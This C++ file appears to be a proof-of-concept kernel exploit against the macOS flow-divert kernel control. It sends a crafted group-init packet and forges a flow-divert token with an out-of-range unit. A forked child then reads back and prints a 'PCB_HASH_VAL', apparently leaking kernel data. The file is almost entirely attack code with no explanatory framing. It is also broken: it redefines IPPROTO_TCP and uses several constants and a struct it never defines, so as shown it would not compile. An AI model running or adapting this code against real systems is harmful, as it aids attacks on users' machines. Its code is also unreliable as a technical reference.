// clang++ -std=c++11 -o main main.cpp

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sys/kern_control.h>
#include <sys/sys_domain.h>

// Costanti definite
constexpr int IPPROTO_TCP = 6;
constexpr int FLOW_DIVERT_TLV_CTL_UNIT = 10;
constexpr int FLOW_DIVERT_TLV_AGGREGATE_UNIT = 26;
constexpr int SO_FLOW_DIVERT_TOKEN = 0x1106;
constexpr int FLOW_DIVERT_TLV_SIGNING_ID = 25;
constexpr char CONTROL_NAME[] = "com.apple.flow-divert";
constexpr uint32_t TOKEN_KEY = 0xDEADBEEF;
constexpr uint32_t UNIT_MAX = 0x0FFFFFFF;

struct Control {
    char Type;
    uint32_t Length;
    uint32_t Unit;
} __attribute__((packed));

struct Aggregate {
    char Type;
    uint32_t Length;
    uint32_t Unit;
} __attribute__((packed));

struct SigningId {
    uint8_t Type;
    uint32_t Length;
    uint32_t ID;
} __attribute__((packed));

struct FlowDivertCreatePacket {
    Control control_unit;
    Aggregate aggregate_unit;
    SigningId signing;
} __attribute__((packed));

int sock_fd[4];
uint32_t pcb_hash;

void do_token() {
    sock_fd[0] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock_fd[0] < 0) {
        perror("[do_token:socket]");
        exit(EXIT_FAILURE);
    }

    FlowDivertCreatePacket packet{
        .control_unit = {
            .Type = FLOW_DIVERT_TLV_CTL_UNIT,
            .Length = htonl(4),
            .Unit = htonl(UNIT_MAX),
        },
        .aggregate_unit = {
            .Type = FLOW_DIVERT_TLV_AGGREGATE_UNIT,
            .Length = htonl(4),
            .Unit = htonl(0),
        },
        .signing = {
            .Type = FLOW_DIVERT_TLV_SIGNING_ID,
            .Length = htonl(4),
            .ID = htonl(0),
        },
    };

    if (setsockopt(sock_fd[0], SOL_SOCKET, SO_FLOW_DIVERT_TOKEN, &packet, sizeof(packet)) < 0) {
        perror("[do_token:setsockopt]");
        exit(EXIT_FAILURE);
    }

    char to_BUF[64] = {0};
    socklen_t length = sizeof(to_BUF);

    if (!fork()) {
        printf("Child PID: %d\n", getpid());
        if (listen(sock_fd[0], 5) < 0) {
            perror("[do_token:listen]");
            exit(EXIT_FAILURE);
        }
        if (getsockopt(sock_fd[0], SOL_SOCKET, SO_FLOW_DIVERT_TOKEN, to_BUF, &length) < 0) {
            perror("[do_token:getsockopt]");
            exit(EXIT_FAILURE);
        }
        pcb_hash = *(uint32_t*)(to_BUF + 14);
        printf("PCB_HASH_VAL: %#x\n", pcb_hash);
    }
}

int sock_kctl[32];

void connect_kctl(int index) {
    sock_kctl[index] = socket(AF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL);
    if (sock_kctl[index] < 0) {
        perror("[connect_kctl:socket]");
        exit(EXIT_FAILURE);
    }

    struct ctl_info info = {};
    strlcpy(info.ctl_name, CONTROL_NAME, sizeof(info.ctl_name));
    if (ioctl(sock_kctl[index], CTLIOCGINFO, &info) < 0) {
        perror("[connect_kctl:ioctl]");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_ctl target = {};
    target.sc_len = sizeof(target);
    target.sc_family = AF_SYSTEM;
    target.ss_sysaddr = AF_SYS_CONTROL;
    target.sc_id = info.ctl_id;
    target.sc_unit = UNIT_MAX;

    if (connect(sock_kctl[index], (struct sockaddr*)&target, sizeof(target)) < 0) {
        perror("[connect_kctl:connect]");
        exit(EXIT_FAILURE);
    }
}

void group_init(int fd) {
    const size_t buf_size = 512;
    char* mem = (char*)malloc(buf_size);
    if (!mem) {
        perror("[group_init:malloc]");
        exit(EXIT_FAILURE);
    }

    bzero(mem, buf_size);
    struct flow_divert_packet_header {
        uint32_t packet_type;
        uint32_t conn_id;
    } __attribute__((packed));

    auto* init_packet = (flow_divert_packet_header*)mem;
    init_packet->packet_type = FLOW_DIVERT_PKT_GROUP_INIT;
    init_packet->conn_id = htonl(0);

    auto* key_size = (struct init_data*)(mem + sizeof(flow_divert_packet_header));
    key_size->Type = FLOW_DIVERT_TLV_TOKEN_KEY;
    key_size->Length = htonl(4);
    *(uint32_t*)(key_size->to_BUF) = htonl(4);

    auto* token = (struct init_data*)(mem + sizeof(flow_divert_packet_header) + 9);
    token->Type = FLOW_DIVERT_TLV_TOKEN_KEY;
    token->Length = htonl(4);
    *(uint32_t*)(token->to_BUF) = htonl(TOKEN_KEY);

    size_t length = sizeof(flow_divert_packet_header) + 9 + 9;
    if (send(fd, mem, length, 0) < 0) {
        perror("[group_init:send]");
        free(mem);
        exit(EXIT_FAILURE);
    }
    free(mem);
}

int main() {
    printf("Parent PID: %d\n", getpid());

    connect_kctl(0);
    group_init(sock_kctl[0]);
    do_token();

    sleep(10);

    printf("Closing sockets\n");
    close(sock_fd[0]);
    close(sock_kctl[0]);

    return 0;
}
